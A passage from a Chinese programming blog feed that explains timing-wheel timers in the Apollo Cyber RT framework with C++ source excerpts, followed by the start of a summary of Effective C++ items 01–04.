数据结构说明了这点），但是内核每次都需要<strong>遍历整个队列</strong>来找到超时的定时器，这在队列很长时是无法忍受的。虽然我们可以很方便地实现插入、删除定时器的操作，但查询的时间过慢。</p><p>另一种方案，将链表以超时时刻进行排序也很难令人满意。因为这样虽然可以优化查询时间，但增删一个定时器就会非常费时。为此，Linux 内核采取的方案是，将定时器按它们的超时时刻划分为五组，当定时器超时时间接近时，定时器将随组一起移动。采取<strong>分组定时器</strong>的方法可以在执行软中断的多数情况下，确保内核尽可能减少搜索超时定时器所带来的负担，但<strong>不能</strong>用定时器来实现硬实时任务。</p><h3 id="时间轮">时间轮</h3><p>那么，Apollo Cyber RT 中的定时器是怎么实现的呢？Cyber RT 的定时器有一个时间轮<sup>2</sup>，负责安排定时任务的启动顺序。<strong>时间轮</strong>最早由 George Varghese 提出，目的就是为解决传统算法中操作系统定时器的任务启动与管理的低效率问题。使用时间轮调度定时器任务，可以在 O(1) 时间内完成启动、停止和查找管理定时器。</p><p>下面举个例子来说明时间轮的工作原理<sup>3</sup>。如下图所示，这是一个简单的时间轮。</p><p><img src="/img/timing_wheel.png" alt=""></p><p>它一共有 8 格槽位（bucket），每个槽位代表了一个单位时间。整个轮子类似于时钟，每过一个单位时间，上面的指针就会往下走一格。开始时指向第 0 个槽位，过了一个单位时间后，指向第 1 个槽位。每个槽位中可能会有多个任务，用链表将他们连接起来。</p><p>我们通过一个例子来具体说明时间轮是如何添加、删除和查找任务。假设单位时间为 1 秒。当前有 2 个定时任务A、B，分别需要 3 秒、11 秒执行一次。见下图，目前指针指在 0 的位置，3 秒钟之后指针将指向 <code>bucket[3]</code> 的位置，因此我们把任务A放入 <code>bucket[3]</code> 中，接下来我们再看如何放置任务 B，任务 B 是 11 秒之后执行，也就是说时间轮转一圈之后，再过 3 秒种，任务 B 才执行。为标记任务的圈数，引入了 round ，round 为 1 就表示需要 1圈，同理推广到其它圈数。我们把 B 任务也放入 <code>bucket[3]</code>，但是设置它的 round 为 1。 我们先看下任务 A 和任务 B 的执行过程，3 秒钟之后时间轮转到 <code>bucket[3]</code>，这时候检查 <code>bucket[3]</code> 中的任务，只执行 round 为 0 的任务，这里执行任务 A，然后把 <code>bucket[3]</code> 中所有任务的 round 减1，这时候任务B的 round 数为 0 了，等到时间轮转一圈之后，就会执行任务B了。任务 A 执行完成之后，会把任务 A 从 <code>bucket[3]</code> 中删除，然后重新计算时间 3+3，放入 <code>bucket[6]</code> 中，等到 <code>bucket[6]</code> 执行完成之后，然后再放入 (6+3)% 8 取余，放入 <code>bucket[1]</code> 中。每次任务执行完成之后，都需要重新计算任务的时间，确定 bucket 的位置，然后放入对应的 bucket 中。</p><p><img src="/img/timing_wheel_progress.png" alt=""></p><p>通过上面这个简单的例子，大家应该可以明白，时间轮算法的插入、删除、查找执行的复杂度都是O(1)，由时间轮实现的定时器非常高效。</p><h2 id="Cyber-定时器">Cyber 定时器</h2><p>在 <code>cyber/timer/timer.h</code> 中，<em>class</em><code>Timer</code> 用于执行单次或周期性的定时任务。它的某些用户接口如下：</p><ul><li><pre><code class="language-c">Timer(uint32_t period, std::function&lt;void()&gt; callback, bool oneshot) <figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><br><span class="hljs-title">  创建一个新的 [Timer](https:</span>//cyber-rt.readthedocs.io/en/latest/api/cppapi.html#classapollo_1_1cyber_1_1_timer) 对象。<br><br>  - `period`：定时器的周期，单位为 ms<br>  - `callback`：定时器需要执行的任务<br>  - `oneshot`：<span class="hljs-literal">True</span>：仅在接下来第一个周期中执行 `callback` 。<span class="hljs-literal">False</span>：在每个周期中都执行 `callback`<br><br>- ```c<br>  void SetTimerOption(TimerOption opt) <br></code></pre></td></tr></table></figure>设置 [TimerOption](https://cyber-rt.readthedocs.io/en/latest/api/cppapi.html#_CPPv4N6apollo5cyber11TimerOptionE) 对象。其中 `TimerOption` 对象的三个成员恰好就是上面函数的三个参数。</code></pre></li><li><pre><code class="language-c">void Start() <figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><br>  开始计时<br><br>- ```c<br>  void Stop() <br></code></pre></td></tr></table></figure>停止计时</code></pre></li></ul><p>和我们的理论一样，定时器最重要的无非就是这三个：1）触发任务的时刻（或者说周期）。2）需要执行什么任务（称之为回调函数）。3）考虑到周期性要求，加上是否为单次触发的标志。</p><h3 id="初始化与定时">初始化与定时</h3><p>让我们先抛开时间轮这个复杂的玩意，先从 <code>Timer</code> 出发，了解一下 <code>Timer</code> 的初始化与定时过程，之后再逐步了解时间轮的工作机制。<code>Timer</code> 初始化过程很简单，就是在 <code>Timer</code> 对象中创建 <code>Task</code> 任务并注册回调函数（callback）。</p><p>但回调函数在到指定时刻后，会：</p><ol><li>开始执行具体的函数操作</li><li>得到累计时间误差和实际执行时间，并重新计算任务下一次执行的间隔<ol><li>如果执行的时间已经大于给定的周期，那么在下一个 tick 中马上执行。</li><li>如果出现累计误差，进行调整补偿（下文会提到如何补偿）</li></ol></li><li>向时间轮中增加定时任务（限定于周期性）</li></ol><p>我简单地画了一张图，方便大家理解。考虑到每个周期执行完后，都会因各种各样的原因产生时间误差，这些时间误差累积起来会对整个系统的时间确定性产生致命的影响，因此必须采取措施消除误差。参看下图，只要重新计算 <code>next_fire_duration = interval - execute_time - error_time</code> ，就可以校正误差。</p><center><img src="/img/period.png" /></center><h3 id="重头戏：时间轮">重头戏：时间轮</h3><p>在一切开始之前，我们先明确一下：时间轮是一个<strong>单例模式</strong>，而定时器会有多个。这意味着所有的定时器的所有定时任务都会出现在这一个时间轮上。</p><p>好，再来看一下 <code>cyber/timer/timing_wheel.h</code> 文件，我们可以了解到时间轮的详细设计情况。说实话，比我想象的要复杂一些😓。Cyber 有两级时间轮，其中，主时间轮（第一级时间轮）有 512 个槽位，而辅助时间轮（第二级时间轮）有 64 个槽位，主时间轮的最小单位时间为 2 ms，而辅助时间轮的单位时间是 512 * 2 ms，这是因为辅助时间轮是在主时间轮不够表示比较长的时间周期的情况下，使用的，意思是说主时间轮转一圈，辅助时间轮走一格。这就意味着，Cyber 支持的最长的周期就是 512 * 64 * 2 ms，大概是 10.75 分钟。</p><img src="/img/timing_wheel_multi.png" style="zoom:67%;" /><p>那么有了这些预备知识后，前文我们提到的“定时器会向时间轮内增加任务”的步骤，就比较清楚明白了：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">TimingWheel::AddTask</span><span class="hljs-params">(<span class="hljs-type">const</span> std::shared_ptr&lt;TimerTask&gt;&amp; task,</span></span><br><span class="hljs-params"><span class="hljs-function">                          <span class="hljs-type">const</span> <span class="hljs-type">uint64_t</span> current_work_wheel_index)</span> </span>&#123;<br>  <span class="hljs-keyword">if</span> (!running_) &#123;<br>    <span class="hljs-built_in">Start</span>();<span class="hljs-comment">/* 稍后来关注如何 Start */</span><br>  &#125;<br>  <br>  <span class="hljs-comment">// 先计算一下 任务应该被分配到哪个槽位</span><br>  <span class="hljs-keyword">auto</span> work_wheel_index = current_work_wheel_index +<br>                          <span class="hljs-built_in">static_cast</span>&lt;<span class="hljs-type">uint64_t</span>&gt;(std::<span class="hljs-built_in">ceil</span>(<br>                              <span class="hljs-built_in">static_cast</span>&lt;<span class="hljs-type">double</span>&gt;(task-&gt;next_fire_duration_ms) /<br>                              TIMER_RESOLUTION_MS));<br>  <span class="hljs-comment">// 如果超出最大值，产生了绕圈</span><br>  <span class="hljs-keyword">if</span> (work_wheel_index &gt;= WORK_WHEEL_SIZE) &#123;<br>    <span class="hljs-keyword">auto</span> real_work_wheel_index = <span class="hljs-built_in">GetWorkWheelIndex</span>(work_wheel_index);<br>    task-&gt;remainder_interval_ms = real_work_wheel_index;<br>    <span class="hljs-keyword">auto</span> assistant_ticks = work_wheel_index / WORK_WHEEL_SIZE;<br>      <span class="hljs-comment">// 没有被套圈，那就直接加入到槽位里面</span><br>    <span class="hljs-keyword">if</span> (assistant_ticks == <span class="hljs-number">1</span> &amp;&amp;<br>        real_work_wheel_index &lt; current_work_wheel_index_) &#123;<br>      work_wheel_[real_work_wheel_index].<span class="hljs-built_in">AddTask</span>(task);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// 被套圈了，需要加入到辅助时间轮内，否则会被过早地运行</span><br>      <span class="hljs-keyword">auto</span> assistant_wheel_index = <span class="hljs-number">0</span>;<br>      &#123;<br>        <span class="hljs-function">std::lock_guard&lt;std::mutex&gt; <span class="hljs-title">lock</span><span class="hljs-params">(current_assistant_wheel_index_mutex_)</span></span>;<br>        assistant_wheel_index = <span class="hljs-built_in">GetAssistantWheelIndex</span>(<br>            current_assistant_wheel_index_ + assistant_ticks);<br>        assistant_wheel_[assistant_wheel_index].<span class="hljs-built_in">AddTask</span>(task);<br>      &#125;<br>    &#125;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-comment">// 一切正常，直接加入到槽位</span><br>    work_wheel_[work_wheel_index].<span class="hljs-built_in">AddTask</span>(task);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>那么这一切是怎么开始的呢？我们回到一开始忽略的 <code>TimingWheel::Start()</code> 函数：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">TimingWheel::Start</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-function">std::lock_guard&lt;std::mutex&gt; <span class="hljs-title">lock</span><span class="hljs-params">(running_mutex_)</span></span>;<br>  <span class="hljs-keyword">if</span> (!running_) &#123;<br>    running_ = <span class="hljs-literal">true</span>;<br>    tick_thread_ = std::<span class="hljs-built_in">thread</span>([<span class="hljs-keyword">this</span>]() &#123; <span class="hljs-keyword">this</span>-&gt;<span class="hljs-built_in">TickFunc</span>(); &#125;);<br>    scheduler::<span class="hljs-built_in">Instance</span>()-&gt;<span class="hljs-built_in">SetInnerThreadAttr</span>(<span class="hljs-string">&quot;timer&quot;</span>, &amp;tick_thread_);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>哎嘿，有没有发现，这里居然需要用到之前讲的 <code>scheduler</code> 类，把时间轮内的线程加载到 <code>scheduler</code> 类的框架中统一管理，详见<a href="https://dingfen.github.io/apollo/2020/10/17/Cyber-RT.html">Apollo Cyber RT 调度系统解析</a>。</p><p>问题自然就来了，这个时间轮自带的线程需要干嘛呢？我们看一下它调用的 <code>TickFunc()</code> 函数。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">TimingWheel::Tick</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-comment">// 取出主时间轮中 当前指向的槽位的列表</span><br>  <span class="hljs-keyword">auto</span>&amp; bucket = work_wheel_[current_work_wheel_index_];<br>  &#123;<br>    <span class="hljs-function">std::lock_guard&lt;std::mutex&gt; <span class="hljs-title">lock</span><span class="hljs-params">(bucket.mutex())</span></span>;<br>    <span class="hljs-keyword">auto</span> ite = bucket.<span class="hljs-built_in">task_list</span>().<span class="hljs-built_in">begin</span>();<br>      <span class="hljs-comment">// 遍历整个列表 依次执行所有任务</span><br>    <span class="hljs-keyword">while</span> (ite != bucket.<span class="hljs-built_in">task_list</span>().<span class="hljs-built_in">end</span>()) &#123;<br>      <span class="hljs-keyword">auto</span> task = ite-&gt;<span class="hljs-built_in">lock</span>();<br>      <span class="hljs-keyword">if</span> (task) &#123;<br>        <span class="hljs-keyword">auto</span>* callback =<br>            <span class="hljs-keyword">reinterpret_cast</span>&lt;std::function&lt;<span class="hljs-built_in">void</span>()&gt;*&gt;(&amp;(task-&gt;callback));<br>        cyber::<span class="hljs-built_in">Async</span>([<span class="hljs-keyword">this</span>, callback] &#123;<br>          <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>-&gt;running_) &#123;<br>            (*callback)();<br>          &#125;<br>        &#125;);<br>      &#125;<br>        <span class="hljs-comment">// 执行完一个删一个</span><br>      ite = bucket.<span class="hljs-built_in">task_list</span>().<span class="hljs-built_in">erase</span>(ite);<br>    &#125;<br>  &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">TimingWheel::Cascade</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">uint64_t</span> assistant_wheel_index)</span> </span>&#123;<br>    <span class="hljs-comment">// 辅助时间轮移动了一个</span><br>  <span class="hljs-keyword">auto</span>&amp; bucket = assistant_wheel_[assistant_wheel_index];<br>  <span class="hljs-function">std::lock_guard&lt;std::mutex&gt; <span class="hljs-title">lock</span><span class="hljs-params">(bucket.mutex())</span></span>;<br>  <span class="hljs-keyword">auto</span> ite = bucket.<span class="hljs-built_in">task_list</span>().<span class="hljs-built_in">begin</span>();<br>    <span class="hljs-comment">// 把辅助时间轮中的任务全部取出来，扔到主时间轮中 因为它们马上就要执行了！</span><br>  <span class="hljs-keyword">while</span> (ite != bucket.<span class="hljs-built_in">task_list</span>().<span class="hljs-built_in">end</span>()) &#123;<br>    <span class="hljs-keyword">auto</span> task = ite-&gt;<span class="hljs-built_in">lock</span>();<br>    <span class="hljs-keyword">if</span> (task) &#123;<br>      work_wheel_[task-&gt;remainder_interval_ms].<span class="hljs-built_in">AddTask</span>(task);<br>    &#125;<br>    ite = bucket.<span class="hljs-built_in">task_list</span>().<span class="hljs-built_in">erase</span>(ite);<br>  &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">TimingWheel::TickFunc</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-function">Rate <span class="hljs-title">rate</span><span class="hljs-params">(TIMER_RESOLUTION_MS * <span class="hljs-number">1000000</span>)</span></span>;  <span class="hljs-comment">// ms to ns</span><br>  <span class="hljs-keyword">while</span> (running_) &#123;<br>    <span class="hljs-built_in">Tick</span>();<br>    tick_count_++;<br>    rate.<span class="hljs-built_in">Sleep</span>();<br>      <span class="hljs-comment">// 主时间轮移动一格</span><br>    &#123;<br>      <span class="hljs-function">std::lock_guard&lt;std::mutex&gt; <span class="hljs-title">lock</span><span class="hljs-params">(current_work_wheel_index_mutex_)</span></span>;<br>      current_work_wheel_index_ =<br>          <span class="hljs-built_in">GetWorkWheelIndex</span>(current_work_wheel_index_ + <span class="hljs-number">1</span>);<br>    &#125;<br>      <span class="hljs-comment">// 当主时间轮转完一圈后，辅助时间轮会移动到下一格</span><br>    <span class="hljs-keyword">if</span> (current_work_wheel_index_ == <span class="hljs-number">0</span>) &#123;<br>      &#123;<br>        <span class="hljs-function">std::lock_guard&lt;std::mutex&gt; <span class="hljs-title">lock</span><span class="hljs-params">(current_assistant_wheel_index_mutex_)</span></span>;<br>        current_assistant_wheel_index_ =<br>            <span class="hljs-built_in">GetAssistantWheelIndex</span>(current_assistant_wheel_index_ + <span class="hljs-number">1</span>);<br>      &#125;<br>        <span class="hljs-comment">// 辅助时间轮 指向的槽位 要把所有槽位内的任务都移入到主时间轮中</span><br>      <span class="hljs-built_in">Cascade</span>(current_assistant_wheel_index_);<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>代码有点长，还涉及了很多我没有见过的类，理解起来有点困难，但是振作一点，我们快要胜利了💪。结论先行，这个线程其实就是维持时间轮运行的“齿轮”。首先，<code>rate(TIMER_RESOLUTION_MS * 1000000)</code> 将时间精确到了纳秒级别，以便于精细化控制。然后就进入了主循环：</p><ol><li>首先调用 <code>Tick()</code> 函数，从代码里我们不难理解，该函数就是将已经<strong>到点的定时任务启动执行</strong>，而且从 <code>cyber::Async</code> 名字上看，还是异步执行（或许我下一篇博客可以聊一聊这个？）。任务执行完成后，全部从列表中删除。</li><li>将主时间轮的指针往前拨动一格。</li><li>如果此时主时间轮一圈走完了，那就应当将辅助时间轮的指针往前拨动一格。</li><li>如果辅助时间轮的指针移动了一格，<code>Cascade</code> 函数就要把<strong>辅助时间轮的指针指向的槽位</strong>的列表里的所有任务全部取出来放入到主时间轮中，因为很快就要轮到它们执行了。</li></ol><hr><p><strong>Update at 9:00 Oct. 23rd</strong></p><h2 id="定时器组件">定时器组件</h2><p>我今天闲来无事，将 Apollo Cyber 的代码打开，看了许久才发现了 Cyber 中使用定时器奥秘。我今后会出一篇博客更详细的解释一下 component 的相关内容，但在这里我就直奔主题了。</p><p>打开 <code>cyber/component/timer_component.h</code> 文件，我们就可以一睹 <code>TimerComponent</code> 类的定义。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">TimerComponent</span> : <span class="hljs-keyword">public</span> ComponentBase &#123;<br>    <span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">TimerComponent</span>();<br>  ~<span class="hljs-built_in">TimerComponent</span>() <span class="hljs-keyword">override</span>;<br>  <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">Initialize</span><span class="hljs-params">(<span class="hljs-type">const</span> TimerComponentConfig&amp; config)</span> <span class="hljs-keyword">override</span></span>;<br>  <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Clear</span><span class="hljs-params">()</span> <span class="hljs-keyword">override</span></span>;<br>  <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">Process</span><span class="hljs-params">()</span></span>;<br>  <span class="hljs-function"><span class="hljs-type">uint64_t</span> <span class="hljs-title">GetInterval</span><span class="hljs-params">()</span> <span class="hljs-type">const</span></span>;<br>    <span class="hljs-keyword">private</span>:<br>  <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">bool</span> <span class="hljs-title">Proc</span><span class="hljs-params">()</span> </span>= <span class="hljs-number">0</span>;<br>  <span class="hljs-type">uint64_t</span> interval_ = <span class="hljs-number">0</span>;<br>  std::unique_ptr&lt;Timer&gt; timer_;<span class="hljs-comment">// 定时器！！</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>嗯哼，乍一看普普通通，但相信通过前面长篇大论的分析，你一定会对最后一个成员非常敏感！结合类的名字，以及 <code>Component</code> 类在整个系统中的地位，我认为 <code>TimerComponent</code> 类就是一个专门为周期性任务（或者时间敏感性任务等）作 base class 的类。</p><p>我们知道，<code>Component</code> 类实际上已经封装得非常好了，Apollo 团队的开发人员只给我们留下了两个接口：<code>Proc()</code> 和 <code>Init()</code> ，而且这两个接口都是私有的，用户只能定义不能调用┑(￣Д ￣)┍。因此，真正的初始化和处理函数还不完全是我们自己写的函数。那么既然如此，先来看看这两个函数是怎么写的：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">TimerComponent::Process</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-keyword">if</span> (is_shutdown_.<span class="hljs-built_in">load</span>())<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">Proc</span>();<span class="hljs-comment">// 平平无奇，就是先看一下有没有关掉，再运行 Proc() 函数</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">TimerComponent::Initialize</span><span class="hljs-params">(<span class="hljs-type">const</span> TimerComponentConfig&amp; config)</span> </span>&#123;<br>  <span class="hljs-keyword">if</span> (!config.<span class="hljs-built_in">has_name</span>() || !config.<span class="hljs-built_in">has_interval</span>()) &#123;<br>    AERROR &lt;&lt; <span class="hljs-string">&quot;Missing required field in config file.&quot;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>  &#125;<br>  node_.<span class="hljs-built_in">reset</span>(<span class="hljs-keyword">new</span> <span class="hljs-built_in">Node</span>(config.<span class="hljs-built_in">name</span>()));<br>  <span class="hljs-built_in">LoadConfigFiles</span>(config);<br>    <span class="hljs-comment">// 把配置文件和信息全部读入后，使用 Init() 函数初始化</span><br>  <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">Init</span>())<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>  std::shared_ptr&lt;TimerComponent&gt; self =<br>      std::<span class="hljs-built_in">dynamic_pointer_cast</span>&lt;TimerComponent&gt;(<span class="hljs-built_in">shared_from_this</span>());<br>    <span class="hljs-comment">// 它把配置文件中的“周期”，以及 func（其实就是 Proc）扔到了定时器中！</span><br>  <span class="hljs-keyword">auto</span> func = [self]() &#123; self-&gt;<span class="hljs-built_in">Proc</span>(); &#125;;<br>  timer_.<span class="hljs-built_in">reset</span>(<span class="hljs-keyword">new</span> <span class="hljs-built_in">Timer</span>(config.<span class="hljs-built_in">interval</span>(), func, <span class="hljs-literal">false</span>));<br>  timer_-&gt;<span class="hljs-built_in">Start</span>();<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>哦，原来定时器在 <code>TimerComponent::Initialize</code> 派上了大用场。<code>TimerComponent</code> 类只需要将周期从配置文件中读出来，再加上用户自己写的 <code>Proc()</code> 函数，就可以新建一个定时器，然后根据我们上面已经介绍的机制，就可以实现定时地做一些周期性工作了。</p><h2 id="总结">总结</h2><p>这篇博客中，我首先介绍了一下定时器的概念，然后，从 Linux 系统出发，对定时器的使用、实现以及涉及的算法做了简单的介绍。由易到难，最终对 Cyber RT 的定时器实现有了详尽的解释。</p><ul><li>时间轮算法在启动、停止、查找管理方面的时间复杂度都是 O(1)</li><li>Apollo Cyber RT 使用了两级时间轮，同时满足了精确的时间单位和长时间的周期需求。</li><li>定时器与 <code>scheduler</code> 类和 Task 的管理、运行方面都有非常紧密的关系，值得深入探究。</li></ul><h2 id="参考文献">参考文献</h2><p>[1] Robert Love <em>Linux Kernel Development Third Edition</em>  11th chapter</p><p>[2] <a href="http://www.cs.columbia.edu/~nahum/w6998/papers/sosp87-timing-wheels.pdf">George Varghese and Tony Lauck <em>Hashed and Hierarchical Timing Wheels: Data Structures for the Efficient Implementation of a Timer Facility</em></a></p><p>[3] <a href="https://github.com/daohu527/Dig-into-Apollo/tree/master/cyber/source">dig-into-Apollo</a></p>]]></content>
    
    
    <categories>
      
      <category>Apollo</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Apollo</tag>
      
      <tag>Cyber RT</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Effective C++ 内容提要（上）</title>
    <link href="/2020/10/20/2020-10-20-EffectiveCpp1/"/>
    <url>/2020/10/20/2020-10-20-EffectiveCpp1/</url>
    
    <content type="html"><![CDATA[<h1>Effective C++</h1><p><a href="https://book.douban.com/subject/1231590/">Effective C++</a> 的内容提要。博主通读完一遍 <a href="https://book.douban.com/subject/1231590/">Effective C++</a> 后，深感 C++ 的编写不易，在写程序时需要时刻考虑方方面面的多种因素，但我深知这些知识看完就会遗忘，因而将每个条款最精要的部分记录在此，方便自己和他人随时翻看。</p><h2 id="让自己习惯-C">让自己习惯 C++</h2><h3 id="条款-01：视-C-为语言联邦">条款 01：视 C++ 为语言联邦</h3><p>要将 C++ 视为一个由相关语言组成的联邦而非单一语言。在其中某个次语言中，各种守则都比较易懂，但当从一个次语言切换到另一个，编程守则就可能改变。有 4 个主要的次语言：</p><ul><li>C</li><li>Object-Oriented C++</li><li>Template C++</li><li>STL</li></ul><h3 id="条款-02：尽量以-const-enmu-inline-替换-define">条款 02：尽量以 const enmu inline 替换 #define</h3><p>也可以说成”宁可以编译器替换预处理器“。因为<code>#define</code> 定义的符号无法进入记号表；没有作用域；不遵守访问规则；用宏实现函数会很麻烦等缺点。</p><p>可以使用 <code>const</code> 对象或者 <code>class</code> 中的 <code>static const</code> 对象替换 <code>#define</code> 中单纯的常量，用 <code>inline</code> 函数替换 <code>#define</code> 定义的“宏函数”，并不会带来额外的运行时间开销。</p><h3 id="条款-03：尽可能使用-const">条款 03：尽可能使用 const</h3><p>只要某个值保持不变是事实，就应该用 <code>const</code> 指明。<strong>若关键字 <code>const</code> 出现在 * 左边，表示被指物是常量；出现在 * 右边，表示指针自身是常量</strong>。关于 <code>const</code>：</p><ul><li><p>令函数返回一个常量值，减少意外发生。<code>const Rational operator*(...);</code> 可以防止用户写出 <code>if ((a * b) = c)</code></p></li><li><p>两个成员函数若只是常量性不同，可以被重载。<code>const char&amp; operator[]() const</code> 与 <code>char&amp; operator[]()</code></p></li><li><p>注意 bitwise constness 和 logical constness，可以使用 <code>mutable</code> 关键字</p></li><li><p>在 <code>const</code> 和 <code>non-const</code> 成员函数中避免重复。令 <code>non-const</code> 版本调用 <code>const</code> 版本避免重复</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">char</span>&amp; <span class="hljs-keyword">operator</span>[](std::<span class="hljs-type">size_t</span> position) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">const_cast</span>&lt;<span class="hljs-type">char</span>&amp;&gt;(<span class="hljs-built_in">static_cast</span>&lt;<span class="hljs-type">const</span> XX&amp;&gt;(*<span class="hljs-keyword">this</span>)[position]);<br>&#125;<br><br><span class="hljs-type">const</span> <span class="hljs-type">char</span>&amp; <span class="hljs-keyword">operator</span>[](std::<span class="hljs-type">size_t</span> position) <span class="hljs-type">const</span> &#123;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h3 id="条款-04：确定对象被使用前已先被初始化">条款 04：确定对象被使用前已先被初始化</h3><p>确保每一个构造函数都将对象的每一个成员初始化。注意在构造函数中，要使用 member initialization list 进行初始化。</p><p>C++ 有着十分固定的成员初始化次序。最好总是以声明的次序进行初始化。</p><p>注意不同编译单元内定义的 non-local static 对象的初始化次序。解决方法：将每个 non-local static 对象搬运到自己的专属函数内（该对象在此函数声明为 <code>static</code>）。这些函数返回一个 reference 指向它所含的对象。即 non-local static 